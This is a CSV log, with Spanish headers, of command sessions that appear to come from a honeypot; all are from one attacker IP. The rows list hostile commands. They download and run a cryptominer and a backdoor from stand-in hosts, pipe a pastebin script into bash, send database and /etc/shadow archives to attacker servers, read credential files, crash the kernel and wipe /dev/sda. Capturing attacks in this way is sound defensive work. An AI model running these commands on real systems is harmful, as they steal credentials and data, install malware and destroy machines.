Session_ID,Timestamp,IP_Atacante,Secuencia_Comandos,Total_Comandos
022d21cc59a4,2026-04-20T16:52:41.973106Z,88.13.24.103,ls -la -> whoami -> pwd -> cat /etc/passwd,4
e068bba609f6,2026-04-20T17:09:22.528475Z,88.13.24.103,date -> find /var/www/ -name '*.env' -> cd .. -> cat /var/www/html/.env -> clear -> exit,6
e180f37a82ff,2026-04-20T17:09:45.899787Z,88.13.24.103,cd ~ -> cd /tmp -> uptime -> wget http://malware-domain.com/xmrig.tar.gz -> tar  -zxvf  xmrig.tar.gz -> chmod +x xmrig -> ./xmrig -o pool.com:3333 -u hacker ->  -> rm -rf xmrig* -> exit,10
2dbb70910136,2026-04-20T17:11:43.802449Z,88.13.24.103,zip -r data.zip /var/lib/mysql -> wget --post-file=data.zip http://exfil-server.com/receive ->  -> rm  data.zip -> cd .. -> exit,6
1db2ddc0d8a0,2026-04-20T17:12:33.626244Z,88.13.24.103,"mkdir  .hidden -> cd .hidden -> wget http://evil.com/backdoor.elf -> ls -la -> chmod +x backdoor.elf -> uptime -> ./backdoor.elf & -> <!DOCTYPE HTML>; <html>;     <head>;         <title>404 Error - Page Not Found</title>;         <style>;             body{ margin:0; border: 0; padding: 0; };         </style>;         <script src=""//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js""></script>;         <script type=""text/javascript"" language=""JavaScript"">;             var url = 'http://www.searchvity.com/?dn=';                 + document.domain + '&pid=9POL6F2H4';;             $(document).ready(function() {;                 $('#ad_frame').attr('src', url);;             });;         </script>;     </head>;     <body>;         <iframe id=""ad_frame"" src=""http://www.searchvity.com/"";             frameborder=""0"" scrolling=""no"">;             <!-- browser does not support iframe's -->;         </iframe>;     </body>; </html> -> document -> disown",10
43db4c6f07fd,2026-04-20T17:17:33.899400Z,88.13.24.103,echo c > /proc/sysrq-trigger,1
7b17af726e12,2026-04-20T17:17:36.889099Z,88.13.24.103,date -> ps aux -> netstat -tulnp -> ipconfig -> ip a -> ls -lah -> route -n -> arp  -a -> exit,9
75f8bcde3b09,2026-04-20T17:22:05.707981Z,88.13.24.103,curl  -sL  http://pastebin.com/raw/xyz123  |  bash -> exit,2
e342ba33a5d1,2026-04-20T17:22:16.912657Z,88.13.24.103,cat /var/www/html/wp-config.php -> grep -i 'password' /var/www/html/wp-config.php -> exit,3
dca183f1e66a,2026-04-20T17:23:47.226814Z,88.13.24.103,redis-cli  ping -> redis-cli config get dir -> exot,3
a4bedfb5095b,2026-04-20T17:24:38.867232Z,88.13.24.103,uptime -> zip -r data.zip /var/lib/mysql -> wget --post-file=data.zip http://exfil-server.com/receive -> rm  data.zip -> exot -> exit,6
f84cf0d32abf,2026-04-20T17:25:02.432225Z,88.13.24.103,cd /etc -> w -> tar -czvf config_backup.tar.gz passwd shadow ssh/ -> cd ~ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,7
0ef32bc3d8df,2026-04-20T17:26:09.998011Z,88.13.24.103,echo '' -> uname -a -> echo '' -> whoami -> id -> cat /proc/cpuinfo -> cat  /etc/os-release -> free -m -> cd /tmp -> df -h -> exit,11
d9a536120dca,2026-04-20T17:26:54.230449Z,88.13.24.103,cat /var/www/html/wp-config.php -> cd - -> grep -i 'password' /var/www/html/wp-config.php -> exot -> exit,5
980e05e60e15,2026-04-20T17:27:11.100095Z,88.13.24.103,sudo -l -> find  /  -perm  -4000  -type  f  2>/dev/null ->  -> cat /etc/sudoers -> ls -> exit,6
62308b11cbaf,2026-04-20T17:29:04.842213Z,88.13.24.103,cat  /var/www/html/wp-config.php -> grep  -i  'password'  /var/www/html/wp-config.php -> date -> exot -> exit,5
c32cb0b8d82a,2026-04-20T17:31:21.293563Z,88.13.24.103,psql -U postgres -c '\l' -> exit,2
ca07f2ef4623,2026-04-20T17:33:54.611688Z,88.13.24.103,uptime -> cat /etc/hostname -> cat /etc/hosts -> cat /etc/resolv.conf -> exit,5
3afad5e8142f,2026-04-20T17:35:36.023583Z,88.13.24.103,dd  if=/dev/zero  of=/dev/sda  bs=1M  count=10 -> echo '' -> exit,3
36f680e60e7c,2026-04-20T17:37:01.119686Z,88.13.24.103,echo '' -> find /var/www/ -name '*.env' -> ls -lah -> cat /var/www/html/.env ->  -> w -> exit,7
73a751f47e11,2026-04-20T17:41:06.728005Z,88.13.24.103,cd /etc -> cd /tmp -> tar  -czvf  config_backup.tar.gz  passwd  shadow  ssh/ -> curl -F 'data=@config_backup.tar.gz' http://attacker-server.com/upload -> rm config_backup.tar.gz -> exit,6
